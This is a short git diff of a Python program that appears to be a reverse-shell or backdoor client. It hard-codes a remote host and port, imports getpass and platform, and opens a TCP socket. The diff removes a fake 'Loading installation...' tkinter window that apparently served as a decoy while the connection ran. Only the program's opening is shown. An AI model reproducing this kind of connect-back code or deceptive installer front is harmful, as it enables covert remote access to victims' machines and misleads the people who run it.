@@ -4,27 +4,10 @@ import os
 import platform
 import getpass
 from time import sleep
-from tkinter import *
 import threading
 
 RHOST = "192.168.1.104"
 RPORT = 2121
-
-
-def installation_window():
-    updater = Tk()
-    updater.title("Installation")
-    updater.geometry("400x130")
-
-    loading = Label(updater, text="Loading installation...")
-    loading.pack()
-    loading.place(x=150, y=50)
-
-    mainloop()
-
-
-t = threading.Thread(target=installation_window)
-t.start()
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
